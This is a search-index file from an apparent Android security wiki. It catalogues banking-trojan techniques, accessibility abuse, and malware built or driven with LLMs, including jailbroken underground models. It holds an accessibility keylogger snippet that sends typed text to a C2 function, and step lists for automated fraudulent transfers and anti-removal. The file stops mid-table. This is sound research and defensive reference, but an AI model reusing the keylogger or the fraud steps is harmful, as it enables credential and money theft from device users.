{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"AWAKE","text":"<p>Android Wiki of Attacks, Knowledge &amp; Exploits</p> <p>Structured reference for Android security research. How malware works, how attacks exploit the platform, and how to reverse engineer protected applications. Built for practitioners -- offense-focused, cross-referenced, and maintained.</p>"},{"location":"#start-here","title":"Start Here","text":"Malware AnalystReverse EngineerPentesterThreat Intelligence <p>Start with the family catalog and timeline for historical context. Use naming conventions to map between vendor detection names. For analysis methodology, follow static analysis then dynamic analysis. If the sample is packed, identify the packer first -- the analysis decision tree walks through identification by native library, asset structure, and APKiD signature.</p> <p>Key topics: C2 techniques, persistence mechanisms, dynamic code loading, threat actors, grayware</p> <p>Start with packer identification. The comparison matrix ranks all documented protectors across DEX encryption, virtualization, anti-Frida, RASP, and unpacking difficulty. For runtime work, hooking and patching cover Frida, Xposed, and smali modification. The development frameworks section covers 28 frameworks -- each with its own page covering architecture, analysis workflow, hooking strategy, and SSL pinning bypass.</p> <p>Key topics: dynamic analysis environment setup, network interception, SSL pinning bypass, anti-analysis check catalog</p> <p>Start with the attack techniques catalog -- 31 techniques organized by attack surface with technique combination matrix. The permissions section documents what each Android permission unlocks and how it can be abused, with escalation patterns showing how malware moves from auto-granted normal permissions to full device control.</p> <p>Key topics: deep link exploitation, WebView exploitation, content provider attacks, intent hijacking, overlay attacks</p> <p>Start with threat actors for MaaS operator attribution and pricing models. The timeline tracks evolution from 2010 to present. The grayware section covers data broker SDKs, predatory lending, and the gray area between aggressive monetization and malware. The industry section maps security companies, AV engines, naming conventions, and distribution channels.</p> <p>Key topics: naming conventions, periodic reports, geographic hotspots</p>"},{"location":"#2024-2025-trends","title":"2024-2025 Trends","text":"Trend What Changed NFC relay attacks Contactless payment cards cloned via NFC relay for ATM cash withdrawal. Bypasses traditional banking security entirely. OCR-based crypto theft Photos scanned for cryptocurrency seed phrases via on-device OCR. First seen on both Play Store and App Store simultaneously. On-device virtualization Real banking apps installed inside VirtualApp sandbox on the infected device, intercepting all interactions transparently. Reduced permission footprints Full banking trojan functionality with as few as 5 permissions by routing everything through accessibility services. Fake lockscreen PIN capture Fake lockscreens steal device unlock PINs. Used alongside VNC for complete device takeover. Human behavior mimicry Automated transfers typed with natural delays and randomized touch coordinates to evade behavioral biometric fraud detection. Commercial packer adoption Malware authors increasingly use commercial packers (Virbox, DexGuard) rather than custom solutions. Firebase as C2 Firebase Cloud Messaging, Firestore, and Remote Config abused for C2 delivery. Traffic indistinguishable from legitimate app telemetry. Framework evasion .NET MAUI and Xamarin used to hide malicious code in C# blobs that DEX scanners never inspect. India threat surge Rapid growth in MaaS phishing platforms and SpyLoan predatory lending apps targeting Indian banking users."},{"location":"#attack-kill-chain","title":"Attack Kill Chain","text":"<p>How attacks chain together in a typical Android banking trojan operation. Each stage builds on the previous. Full technique catalog with combination matrix in Attack Techniques.</p> Stage Objective How 1. Delivery Get on device Phishing, sideloading, Play Store dropper 2. Dropper Install payload Dynamic code loading, staged download from C2 3. Persistence Survive reboots Boot receivers, foreground services, scheduled jobs 4. Privilege escalation Gain control Accessibility service grant via social engineering, device admin 5. Credential theft Steal logins Overlay injection, keylogging, screen capture 6. 2FA bypass Intercept OTPs SMS interception, notification listener 7. On-device fraud Move money ATS fills transfer fields via accessibility 8. Exfiltration Send to C2 C2 techniques: HTTP, WebSocket, Telegram Bot API, Firebase, SFTP 9. Anti-analysis Avoid detection Emulator checks, Frida detection, device admin anti-uninstall, post-fraud device wipe"},{"location":"#whats-covered","title":"What's Covered","text":"<ul> <li> <p>81 Malware Families</p> <p>Individual write-ups with lineage, capabilities, C2, and campaign history. Lineage maps trace code inheritance through source leaks and MaaS evolution. Timeline from 2010 to present.</p> </li> <li> <p>31 Attack Techniques</p> <p>Organized by attack surface: Activities, Services, Broadcast Receivers, Content Providers, WebViews, and cross-cutting patterns. Each with code examples and family cross-references.</p> </li> <li> <p>13 Packers</p> <p>Identification, protection mechanisms, unpacking methodology, and YARA rules. From easy Chinese packers to expert-level Virbox virtualization.</p> </li> <li> <p>50+ Permissions</p> <p>Every abusable Android permission documented with malware usage, code examples, Frida monitoring scripts, and Android version changes.</p> </li> <li> <p>28 Dev Frameworks</p> <p>Framework-specific reversing: architecture, file layout, hooking strategy, SSL pinning bypass. Flutter, React Native, Unity, .NET MAUI, and 24 more.</p> </li> <li> <p>6 Platform Security Mechanisms</p> <p>Offense perspective on App Sandbox, SELinux, Verified Boot, Keystore, Play Integrity, Biometric Auth.</p> </li> </ul>"},{"location":"#packer-quick-reference","title":"Packer Quick Reference","text":"<p>Run APKiD on the sample. Check the analysis decision tree for the next step. For universal unpacking, hook <code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code> at runtime, or use frida-dexdump to scan process memory for DEX magic bytes.</p> Difficulty What Makes It Hard Examples Easy-Medium Whole-DEX encryption with known structure. Generic memory dump recovers the payload. Chinese packers, AppSealing Medium-Hard Class-level encryption, native anti-Frida, integrity checks. Targeted bypass needed. DexGuard, DexProtector, Appdome Hard Aggressive anti-hooking, Magisk-aware root detection, server-side verification. LIAPP, Arxan, Promon Expert DEX virtualization -- bytecode translated to proprietary VM instructions. Virbox"},{"location":"attacks/","title":"Attack Techniques","text":"<p>Documented exploitation techniques targeting Android applications and the OS. Each technique covers what it is, the preconditions required, how it works in practice, real-world malware that uses it, and how it has evolved across Android versions.</p> <p>Organized by the Android component or mechanism being targeted.</p>"},{"location":"attacks/#techniques","title":"Techniques","text":"Technique Target Surface Key Permissions Overlay Attacks Window Manager <code>SYSTEM_ALERT_WINDOW</code> Accessibility Abuse Accessibility Service <code>BIND_ACCESSIBILITY_SERVICE</code> Screen Capture MediaProjection / Accessibility <code>FOREGROUND_SERVICE</code>, <code>BIND_ACCESSIBILITY_SERVICE</code> Keylogging InputMethodService / Accessibility <code>BIND_ACCESSIBILITY_SERVICE</code> SMS Interception SMS / BroadcastReceiver <code>RECEIVE_SMS</code>, <code>READ_SMS</code> Notification Listener Abuse NotificationListenerService <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Automated Transfer Systems Accessibility + Banking Apps <code>BIND_ACCESSIBILITY_SERVICE</code> Phishing Techniques UI / Social Engineering <code>SYSTEM_ALERT_WINDOW</code> (optional) C2 Communication Network / IPC <code>INTERNET</code> Dynamic Code Loading ClassLoader / Runtime None (app-private storage) Device Admin Abuse DevicePolicyManager <code>BIND_DEVICE_ADMIN</code> Persistence Techniques Services / Receivers <code>RECEIVE_BOOT_COMPLETED</code>, <code>FOREGROUND_SERVICE</code> Intent Hijacking Activities, Services None (component export) Deep Link Exploitation Activities None (URI scheme) WebView Exploitation WebView Varies Content Provider Attacks Content Providers None (provider export) Tapjacking Touch Events <code>SYSTEM_ALERT_WINDOW</code> Task Affinity Attacks Activity Stack None (manifest config) Broadcast Theft Broadcast Receivers Varies NFC Relay NFC / Host Card Emulation NFC (normal) Clipboard Hijacking ClipboardManager None (foreground) or <code>BIND_ACCESSIBILITY_SERVICE</code> App Virtualization VirtualApp / DroidPlugin None (app-level) App Collusion IPC / Shared Storage / SDKs Varies (distributed across apps) AI-Assisted Malware LLMs / Deepfakes / Adversarial ML Varies Anti-Analysis Techniques Emulator / Root / Frida / Debugger <code>QUERY_ALL_PACKAGES</code> Call Interception TelecomManager / CallRedirectionService <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code> Camera &amp; Mic Surveillance Camera / MediaRecorder / MediaProjection <code>CAMERA</code>, <code>RECORD_AUDIO</code> Device Wipe &amp; Ransomware DevicePolicyManager / File System <code>BIND_DEVICE_ADMIN</code>, <code>MANAGE_EXTERNAL_STORAGE</code> Mass Malware Generation MaaS Builders / Crypters / Repackaging None (tooling-level) Network Traffic Interception VpnService / DNS / Certificate Store <code>BIND_VPN_SERVICE</code> Notification Suppression NotificationListenerService / AudioManager <code>BIND_NOTIFICATION_LISTENER_SERVICE</code>"},{"location":"attacks/#kill-chain","title":"Kill Chain","text":"<p>How attacks chain together in a typical Android banking trojan or spyware operation. Each stage builds on the previous one.</p> Stage Objective Techniques / Permissions What Happens 1. Delivery Get on device Phishing, sideloading, Play Store dropper, smishing link APK delivered as fake app (Chrome update, Flash Player, bank app) 2. Dropper Install payload <code>REQUEST_INSTALL_PACKAGES</code>, Dynamic Code Loading Dropper downloads and installs the real malware APK at runtime 3. Persistence Survive reboots Persistence Techniques: <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> Boot receiver re-launches malware; foreground service prevents kill 4. Privilege escalation Gain control Accessibility Abuse, Device Admin Abuse User tricked into enabling accessibility service or device admin; malware can now auto-grant permissions, read screens, inject input, resist uninstall 5. Credential theft Steal logins Overlay Attacks, Keylogging, Screen Capture, Clipboard Hijacking Phishing overlay injected over banking app, keystrokes captured, screen recorded, clipboard monitored for seed phrases 6. 2FA bypass Intercept OTPs SMS Interception, Notification Listener Abuse SMS OTPs intercepted via broadcast receiver or read from notification shade; push-based OTPs captured via notification listener 7. On-device fraud Move money Automated Transfer Systems ATS fills in transfer fields, confirms transactions, hides SMS confirmations 8. Exfiltration Send data to C2 C2 Communication: <code>INTERNET</code> Credentials, SMS, contacts, screen recordings sent to C2 over HTTP/WebSocket 9. Anti-analysis Avoid detection Anti-Analysis Techniques, Device Admin Abuse Check for emulators/AV/Frida, suppress notifications, wipe device on detection"},{"location":"attacks/#technique-combinations","title":"Technique Combinations","text":"<p>Attacks rarely operate alone. These are the most common pairings observed in active malware families.</p> Combination Result Families Using It Overlay + Accessibility Credential theft with ATS -- overlay steals creds, accessibility automates transfers Cerberus, Ermac, Hook, Xenomorph, Octo, GodFather, TsarBot Accessibility + Screen Capture Remote access / VNC -- accessibility provides input control, screen capture provides visual feed Hook, Octo, Vultur, BingoMod, Brokewell Accessibility + Keylogging Full input capture -- every keystroke and text field value recorded Cerberus, Ermac, TrickMo, SpyNote Accessibility + Clipboard Hijacking Crypto theft -- accessibility reads screen content, clipboard captures wallet addresses SparkCat, SpyAgent, Clipper variants Notification Listener + SMS Interception Complete OTP theft -- SMS receiver grabs text-based codes, notification listener catches push-based codes Anatsa, Xenomorph, GodFather Dynamic Code Loading + Phishing Dropper with clean initial scan -- benign APK passes Play Protect, downloads payload post-install Anatsa, SharkBot, Joker Device Admin + Persistence Unremovable malware -- device admin blocks uninstall, persistence survives reboots BRATA, Cerberus, Rafel RAT Overlay + Tapjacking Layered UI deception -- overlay captures input while tapjacking forces user interaction Anubis, BankBot (older families pre-Android 12) Accessibility + NFC Relay Contactless payment fraud -- accessibility extracts card PINs, NFC relay clones tap-to-pay NGate, GoldPickaxe Deep Links + WebView Token theft -- deep link redirects into malicious WebView that leaks auth tokens App-specific exploits, Mandrake Intent Hijacking + Broadcast Theft SMS interception -- hijack SMS broadcast to steal OTPs before the real app sees them FluBot, Anatsa, most banking trojans Accessibility + Content Provider Data exfiltration -- accessibility navigates apps, content provider queries extract stored data Spyware families (Pegasus, Predator) App Virtualization + Accessibility Overlay-free credential theft -- real banking app runs in hostile sandbox, accessibility redirects launch intents GodFather v3, FjordPhantom App Collusion + Persistence Resilient multi-app architecture -- payload survives deletion of the visible dropper app PixPirate Mass Malware Generation + Play Store Evasion Volume-based evasion -- hundreds of variants submitted across distributed developer accounts overwhelm review Vapor (331 apps), Konfety (250+ apps), Joker (1,700+ variants) Notification Suppression + ATS Invisible fraud -- transaction alerts dismissed while ATS moves money Cerberus, Hook, Octo, Xenomorph Call Interception + Phishing Voice phishing -- victim calls real bank number but reaches attacker IVR Fakecalls, Letscall Device Wipe + ATS Post-fraud cleanup -- factory reset destroys evidence after money transfer BRATA, BingoMod Camera/Mic Surveillance + Accessibility Full device surveillance -- camera/mic capture with screen reading and input injection SpyNote, Pegasus Anti-Analysis + Dynamic Code Loading Staged evasion -- environment checks before loading payload; sandbox sees nothing Anatsa, Mandrake, Octo Network Interception + DNS Manipulation Network-level phishing -- DNS hijacking redirects banking domains to credential harvesting MoqHao / Roaming Mantis"},{"location":"attacks/#defense-priority","title":"Defense Priority","text":"<p>Ranked by prevalence in modern (2024-2025) Android malware. Priority reflects how frequently the technique appears in active campaigns and how much damage it enables.</p> Rank Technique Prevalence Why It Matters 1 Accessibility Abuse Nearly universal in banking trojans Enables everything: auto-granting permissions, reading screens, performing ATS, bypassing 2FA 2 Overlay Attacks High (banking trojans) Primary credential harvesting method; still effective despite Android restrictions 3 Screen Capture High (banking trojans, RATs) Real-time VNC and screen recording for credential theft and remote control 4 Keylogging High (banking trojans, spyware) Captures passwords and OTPs as users type; pairs with accessibility for full coverage 5 C2 Communication Universal Every malware family needs a command channel; multi-channel C2 is the norm 6 Persistence Techniques Universal (supporting) Required for any long-running operation; boot receivers and foreground services are baseline 7 Automated Transfer Systems High (banking trojans) On-device fraud that bypasses bank-side device fingerprinting and session checks 8 SMS Interception High (declining on newer OS) Original 2FA bypass method; restricted by Play Store policy but still used in sideloaded malware 9 Notification Listener Abuse High (rising) Replaced SMS interception as primary OTP theft vector; reads all app notifications 10 Dynamic Code Loading High (droppers) Foundation of Play Store evasion; clean APK downloads malicious payload post-install 11 Phishing Techniques High (delivery) Primary infection vector; smishing, fake Play Store pages, social engineering for permissions 12 Clipboard Hijacking Rising (crypto-targeting) Growing alongside cryptocurrency adoption; minimal permissions required from foreground 13 NFC Relay Emerging Bypasses contactless payment security entirely; hard to detect at the device level 14 Device Admin Abuse Moderate (declining) Prevents uninstall and enables device wipe; being replaced by accessibility-based persistence 15 Intent Hijacking Moderate Enables SMS/OTP theft and IPC interception; foundational for many attack chains 16 WebView Exploitation Moderate Targets hybrid apps; token theft, JavaScript injection, MITM within the app 17 Broadcast Theft Moderate (declining) SMS interception still works but restricted on newer Android versions 18 Deep Link Exploitation Moderate OAuth redirect attacks, app navigation hijacking; underestimated in mobile pentests 19 Tapjacking Low (declining) Largely mitigated by <code>filterTouchesWhenObscured</code> and Android 12+ restrictions 20 Task Affinity Attacks Low Niche but effective for targeted phishing within the task switcher 21 Content Provider Attacks Low App-specific; dangerous when providers are exported without proper permissions 22 App Virtualization Emerging (high impact) Runs real banking apps inside malware-controlled sandbox; bypasses overlay detection, repackaging checks, and root detection 23 App Collusion Moderate (SDK-mediated) SDK-based cross-app data aggregation is the dominant model; multi-app malware architectures emerging 24 AI-Assisted Malware Rising LLM-assisted development, deepfake biometric fraud, underground AI tools lowering skill barriers 25 Mass Malware Generation High (infrastructure) MaaS builders, crypter services, and coordinated store submission produce variants faster than detection can scale 26 Anti-Analysis Techniques Universal (supporting) Nearly every family implements emulator/root/Frida detection; determines whether payload executes at all 27 Notification Suppression High (banking trojans) Hides transaction alerts during fraud; dual-purpose with OTP theft via notification listener 28 Camera &amp; Mic Surveillance High (spyware, RATs) Core capability of state-sponsored spyware and surveillance RATs; increasingly restricted by OS 29 Call Interception Moderate (region-specific) Voice phishing via call redirection; dominant in Korean-targeting campaigns 30 Device Wipe &amp; Ransomware Moderate (declining for ransomware, rising for evidence destruction) File encryption declining due to scoped storage; factory reset as post-fraud cleanup is growing 31 Network Traffic Interception Moderate DNS hijacking, VPN abuse, proxy configuration; Android 14 APEX certificate store makes MITM harder"},{"location":"attacks/accessibility-abuse/","title":"Accessibility Abuse","text":"<p>Using Android's accessibility framework to control the device programmatically. An accessibility service can read any screen, click any button, type into any field, and perform any gesture. This gives malware full device control without exploiting any vulnerability: the framework works exactly as designed, just not for its intended purpose.</p> <p>See also: <code>BIND_ACCESSIBILITY_SERVICE</code> for the permission details, Notification Suppression, Anti-Analysis Techniques, Camera &amp; Mic Surveillance</p> <p>Requirements</p> Requirement Details Permission <code>BIND_ACCESSIBILITY_SERVICE</code> (granted via Settings toggle) Social Engineering Convince user to enable the service <p>No exploit needed. The hardest part is getting the user to the Settings toggle and convincing them to enable it. Malware typically uses fake overlay dialogs (\"Enable this service to continue\", \"Battery optimization required\", \"Accessibility update needed\").</p>"},{"location":"attacks/accessibility-abuse/#attack-capabilities","title":"Attack Capabilities","text":""},{"location":"attacks/accessibility-abuse/#keylogging","title":"Keylogging","text":"<p>Accessibility services receive <code>TYPE_VIEW_TEXT_CHANGED</code> events containing the text entered in any field across any app.</p> Keylogging via Accessibility Events <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {\n        String text = event.getText().toString();\n        String packageName = event.getPackageName().toString();\n        sendToC2(packageName, text);\n    }\n}\n</code></pre>"},{"location":"attacks/accessibility-abuse/#auto-granting-permissions","title":"Auto-Granting Permissions","text":"<p>The malware navigates the system UI to grant itself additional permissions:</p> <ol> <li>Open Settings via intent</li> <li>Traverse the view tree to find \"Allow\" or toggle buttons</li> <li>Perform <code>ACTION_CLICK</code> on the target node</li> <li>Repeat for each permission needed</li> </ol> <p>This effectively escalates from one permission (accessibility) to all permissions.</p>"},{"location":"attacks/accessibility-abuse/#on-device-fraud-ats","title":"On-Device Fraud (ATS)","text":"<p>Automated Transfer System: the malware operates the real banking app to initiate transfers. Steps:</p> <ol> <li>Wait for user to log into banking app (or use stolen credentials via overlay)</li> <li>Navigate to transfer screen using accessibility gestures</li> <li>Fill in attacker-controlled recipient and amount</li> <li>Confirm the transaction</li> <li>Intercept OTP from notification and enter it</li> </ol> <p>The user's device is locked or shows a fake \"updating\" screen during the process. The transaction happens through the legitimate banking app, making it harder for bank-side fraud detection to flag.</p>"},{"location":"attacks/accessibility-abuse/#anti-removal","title":"Anti-Removal","text":"<p>The malware prevents its own uninstallation:</p> <ul> <li>Monitors for navigation to Settings &gt; Apps &gt; [malware]</li> <li>When detected, performs <code>GLOBAL_ACTION_HOME</code> or <code>GLOBAL_ACTION_BACK</code> to exit Settings</li> <li>Can also click \"Cancel\" on uninstall confirmation dialogs</li> <li>Some families lock the screen and display a persistent overlay</li> </ul>"},{"location":"attacks/accessibility-abuse/#notification-interception","title":"Notification Interception","text":"<p>With <code>flagRetrieveInteractiveWindows</code>, the accessibility service can read notification content from any app, functioning as an alternative to <code>BIND_NOTIFICATION_LISTENER_SERVICE</code>.</p>"},{"location":"attacks/accessibility-abuse/#screen-streaming-vnc","title":"Screen Streaming / VNC","text":"<p>Some families (Hook, Octo) use accessibility events to build a real-time representation of the screen and stream it to the attacker, creating a VNC-like remote access capability.</p>"},{"location":"attacks/accessibility-abuse/#malware-families-by-accessibility-capability","title":"Malware Families by Accessibility Capability","text":"Family Keylog ATS Anti-Remove Screen Stream Auto-Grant Anatsa Yes Yes Yes No Yes Cerberus Yes No Yes No Yes Hook Yes Yes Yes Yes (VNC) Yes Octo Yes Yes Yes Yes Yes SharkBot No Yes Yes No Yes Xenomorph Yes Yes Yes No Yes Medusa Yes No Yes Yes Yes Hydra Yes No Yes Yes Yes"},{"location":"attacks/accessibility-abuse/#encrypted-messaging-interception","title":"Encrypted Messaging Interception","text":"<p>A technique introduced by Sturnus in 2025 that exploits a fundamental weakness in encrypted messaging apps: messages must be decrypted for display. The accessibility service reads message content after the messaging app has already decrypted it for the user's screen.</p> <p>End-to-end encryption provides no protection</p> <p>This works against WhatsApp, Telegram, Signal, and any app that renders plaintext on the device UI. The malware monitors <code>TYPE_VIEW_TEXT_CHANGED</code> and <code>TYPE_WINDOW_CONTENT_CHANGED</code> events from target messaging packages, capturing message text, sender info, and timestamps. Interception occurs after decryption, at the presentation layer.</p>"},{"location":"attacks/accessibility-abuse/#human-behavior-mimicry","title":"Human Behavior Mimicry","text":"<p>Herodotus introduced typing delays and natural gesture patterns during ATS operations to evade behavioral biometric systems that banks deploy to detect automated device interaction. Rather than filling form fields instantly (a signal that fraud detection systems flag), the malware types characters with randomized inter-keystroke timing and performs swipe gestures at human-plausible speeds.</p>"},{"location":"attacks/accessibility-abuse/#custom-keyboard-keylogging","title":"Custom Keyboard Keylogging","text":"<p>BlankBot and Frogblight implement a custom <code>InputMethodService</code> (IME) that replaces the device keyboard. Once the malware's keyboard is set as default, every keystroke across every app passes through it. Unlike standard accessibility keylogging which captures text change events after the fact, a custom keyboard intercepts each key press directly, capturing passwords, PINs, and messages including characters deleted before submission.</p> <p>The malware uses accessibility to silently navigate to Settings &gt; Language &amp; Input and switch the default keyboard to its own IME without user awareness. On some Android versions, this can be done entirely through accessibility gestures.</p>"},{"location":"attacks/accessibility-abuse/#fake-lockscreen-pin-capture","title":"Fake Lockscreen PIN Capture","text":"<p>TrickMo and TsarBot display a full-screen overlay that replicates the device's lockscreen. When the device \"appears\" to lock, the user enters their PIN or pattern into the malware's fake lockscreen rather than the real one. The captured PIN enables the attacker to unlock the device during remote access sessions. This is distinct from banking overlay phishing since it targets the device unlock credential rather than app-specific credentials.</p>"},{"location":"attacks/accessibility-abuse/#contact-list-injection","title":"Contact List Injection","text":"<p>Crocodilus uses accessibility to add entries to the device's contact list, inserting attacker-controlled phone numbers labeled as \"Bank Support\" or similar. When the victim later needs to contact their bank, they find the injected contact and call the attacker directly. This extends the accessibility attack surface beyond the device into social engineering.</p>"},{"location":"attacks/accessibility-abuse/#social-engineering-to-enable","title":"Social Engineering to Enable","text":"<p>Common lures used to get users to the accessibility settings:</p> Lure Approach \"Accessibility update required\" Fake system dialog \"Battery optimization\" Overlay directing user to enable service \"Security scan\" Fake antivirus requiring accessibility \"Enable to continue\" App refuses to function until enabled \"Google Chrome update\" Impersonates Chrome update process"},{"location":"attacks/accessibility-abuse/#android-mitigations","title":"Android Mitigations","text":"Version Change Impact Android 11 <code>isAccessibilityTool</code> metadata required for visibility Only affects apps targeting API 30+ Android 13 Restricted settings for sideloaded apps Bypassed by session-based installers Android 13 Accessibility shortcut warning improved Users still click through Android 15 Expanded restricted settings Closes some session-installer loopholes <p>Fundamental Limitation</p> <p>There is no technical way to distinguish a malicious accessibility service from a legitimate one at install time. The capability is inherent to the API.</p>"},{"location":"attacks/accessibility-abuse/#families-using-this-technique","title":"Families Using This Technique","text":"Family Primary Accessibility Abuse Cerberus Keylogging Anatsa ATS Hook Screen streaming Ermac Overlay trigger SharkBot ATS Gustuff ATS Xenomorph ATS Octo Screen streaming Hydra Overlay trigger Medusa Screen streaming Vultur Screen streaming GodFather Overlay trigger Chameleon Permission escalation Copybara ATS FluBot Permission escalation MoqHao Auto-execution, permission escalation Zanubis ATS Mamont Permission escalation SoumniBot Data theft Crocodilus Full DTO, contact list injection Herodotus ATS with human behavior mimicry Sturnus Encrypted messaging interception RatOn ATS + NFC relay Klopatra ATS BingoMod VNC-based DTO Brokewell Screen streaming, ATS Albiriox ATS LeifAccess Fake Google Play review posting NGate Permission escalation GoldPickaxe Facial biometric capture SpyNote Keylogging, anti-removal Antidot ATS, keylogging TrickMo Keylogging, fake lockscreen PIN capture TsarBot ATS, fake lockscreen PIN capture BlankBot Custom keyboard keylogging Frogblight Custom keyboard keylogging ToxicPanda ATS BTMOB RAT Credential harvesting, auto-grant Rafel RAT Anti-removal, notification siphoning Gigabud Screen recording trigger, automated payments PJobRAT Data exfiltration BlankBot Custom keyboard keylogging Frogblight Custom keyboard keylogging ToxicPanda ATS Rafel RAT Keylogging, device control Vultur Screen streaming DeVixor Remote access via accessibility FireScam Notification monitoring"},{"location":"attacks/ai-assisted-malware/","title":"AI-Assisted Malware","text":"<p>Large language models and generative AI are being integrated into the Android malware lifecycle at multiple stages: code generation, social engineering, biometric fraud, and evasion of ML-based detectors. The impact so far is more about lowering the skill barrier and accelerating development than creating fundamentally new capabilities, but runtime AI integration and deepfake-based biometric fraud represent genuinely novel attack vectors.</p> <p>See also: Phishing Techniques, Play Store Evasion, C2 Communication</p> <p>Distinguishing Hype from Reality</p> <p>Recorded Future introduced the \"AI Malware Maturity Model\" (AIM3) to classify what truly counts as AI malware. Most current usage is LLMs as a \"force multiplier\" for existing workflows. OpenAI stated in their October 2024 threat report that \"the use of ChatGPT has not led to any significant breakthroughs in malware creation.\" The distinction between AI-assisted and AI-native malware matters: most of what's observed is the former.</p>"},{"location":"attacks/ai-assisted-malware/#categories","title":"Categories","text":""},{"location":"attacks/ai-assisted-malware/#1-llm-assisted-malware-development","title":"1. LLM-Assisted Malware Development","text":"<p>Threat actors using ChatGPT, Gemini, or underground alternatives to write, debug, and refine malware code.</p> <p>STORM-0817: Iranian APT Using ChatGPT for Android Surveillanceware</p> <p>OpenAI disclosed in October 2024 that STORM-0817, an Iran-based threat actor, used ChatGPT to debug and develop Android malware. The malware was described as \"relatively rudimentary\" surveillanceware targeting contacts, call logs, installed packages, screenshots, browsing history, location, and files from external storage. They developed two Android packages (<code>com.example.myttt</code> and <code>com.mihanwebmaster.ashpazi</code>) and used ChatGPT to build server-side C2 code on a WAMP stack with the domain <code>stickhero[.]pro</code>.</p> <p>OpenAI assessed that ChatGPT did not provide capabilities beyond what was already publicly available. BleepingComputer and SC Media covered the disclosure.</p> <p>HP Wolf Security: AI-Generated Malware</p> <p>HP Wolf Security identified in September 2024 a campaign targeting French-speaking users with VBScript and JavaScript showing strong indicators of generative AI authorship: structured comments explaining each line, native-language variable names, and consistent formatting. The malware deployed AsyncRAT. HP characterized this as one of the first documented in-the-wild cases of AI-generated malware.</p>"},{"location":"attacks/ai-assisted-malware/#2-deepfake-biometric-fraud","title":"2. Deepfake Biometric Fraud","text":"<p>The most impactful AI-driven mobile attack vector to date: stealing facial biometric data and using AI face-swapping to bypass bank facial recognition.</p> <p>GoldPickaxe: Facial Biometric Theft</p> <p>Group-IB disclosed in February 2024 that GoldPickaxe, developed by Chinese-speaking threat group GoldFactory, steals facial biometric data on both Android and iOS to generate deepfakes for bypassing bank facial recognition.</p> Aspect Detail Targets Thailand, Vietnam banking apps Disguise Government service apps (Thai \"Digital Pension\" app) Collection Prompts victim to record video: blink, smile, face left/right, nod, open mouth Usage AI face-swapping services create deepfakes to log into victim's banking app Confirmation Thai police confirmed criminals using captured face scans to bypass banking facial recognition <p>This represents a genuine paradigm shift: the malware itself is relatively simple (record video, exfiltrate), but the AI backend (deepfake generation) enables a novel attack that didn't previously exist.</p> <p>AI Voice Cloning in Mobile Vishing</p> <p>Voice phishing surged 442% in 2025. Group-IB documented AI voice cloning in social engineering attacks delivered over mobile calls. Modern AI speech models create realistic impersonation from seconds of target audio. Asia-Pacific saw a 194% surge in deepfake-related fraud attempts in 2024 vs 2023. No public reports document Android malware that autonomously conducts voice cloning; the current model is attackers using separate AI tools then calling victims on their phones.</p>"},{"location":"attacks/ai-assisted-malware/#3-underground-malicious-llm-tools","title":"3. Underground Malicious LLM Tools","text":"<p>Custom, jailbroken, and fine-tuned models sold on underground forums for generating phishing content and malware code.</p> Tool First Seen Base Model Price Status WormGPT July 2023 GPT-J 6B ~60 EUR/month, $220 lifetime Active. New variants on Grok and Mixtral (2024-2025) FraudGPT July 2023 Unknown $90-200/month, $1,700/year Sold by \"CanadianKingpin12\" on dark web. LevelBlue coverage KawaiiGPT July 2025 Open-source Free (GitHub) Unit 42 calls it \"entry-level but effective\" <p>KrebsOnSecurity profiled the WormGPT developer. The original version underperformed expectations (described as \"pretty lame\" by users). The real significance is the trend: commoditizing AI-assisted cybercrime tools that remove technical barriers for low-skill operators.</p> <p>DarkBERT</p> <p>DarkBERT is a legitimate academic project: a BERT-based model pre-trained on 2.2TB of Tor dark web data for cybersecurity research (classifying ransomware leak sites, detecting information leaks). Claims of malicious derivatives (DarkBART) appeared on underground forums but remain largely unverified.</p>"},{"location":"attacks/ai-assisted-malware/#4-runtime-ai-integration","title":"4. Runtime AI Integration","text":"<p>Malware that makes LLM API calls during execution to modify its own behavior.</p> <p>Google Threat Intelligence Group cataloged five malware families with runtime AI integration in their November 2025 report (The Hacker News coverage):</p> Family Mechanism Detail PROMPTFLUX Gemini 1.5 Flash API VBScript malware queries Gemini to rewrite its own source code hourly. \"Thinking Robot\" component instructs the LLM to act as an \"expert VB Script obfuscator.\" Self-propagates via Windows Startup folder. PROMPTLOCK AI-generated payloads Experimental ransomware using AI to generate Lua encryption payloads at runtime. Targets Windows, macOS, Linux. PROMPTSTEAL Hugging Face API Queries Qwen2.5-Coder-32B-Instruct to generate system reconnaissance commands. Used by Russian actor APT28 in Ukraine. FRUITSHELL Hardcoded prompts PowerShell reverse shell designed to bypass LLM-based security analysis tools. <p>These are not Android-specific but represent the state of the art in AI-integrated malware. The techniques (polymorphic code rewriting via LLM, AI-generated payloads, prompt-based evasion) are transferable to mobile.</p>"},{"location":"attacks/ai-assisted-malware/#5-ai-assisted-campaigns","title":"5. AI-Assisted Campaigns","text":"<p>EvilAI Campaign (Trend Micro, September 2025): Operators use AI-generated code and social engineering to disguise malware as legitimate applications (PDF editors, AI-enhanced tools). Professional interfaces with valid digital signatures. AES-encrypted C2 communication. 56 incidents in Europe, 29 in the Americas, 29 in Asia/Middle East/Africa in one week of monitoring.</p> <p>FunkSec (Check Point, January 2025): Ransomware-as-a-service with an AI-assisted Rust-based encryptor. 85+ claimed victims in its first month. Check Point assessed the codebase organization indicated AI assistance that enabled \"rapid iteration despite the author's apparent lack of technical expertise.\"</p>"},{"location":"attacks/ai-assisted-malware/#adversarial-ml-against-android-malware-detectors","title":"Adversarial ML Against Android Malware Detectors","text":"<p>Academic research demonstrating how machine learning can be used to evade ML-based Android malware detection systems. These are proof-of-concept attacks, not observed in the wild, but they demonstrate the theoretical ceiling.</p> Paper Venue Year Technique Evasion Rate Automated Mass Malware Factory NDSS 2025 Adversarial piggybacking: malicious rider extraction + adversarial perturbation + benign carrier selection 88.3% vs Drebin/MaMaDroid, 76-92% vs commercial engines GEAAD Nature Scientific Reports 2025 DOpGAN (dual-opponent GAN) altering opcode distribution features Misclassifies malware as benign EvadeDroid Computers &amp; Security 2023 Black-box evasion via 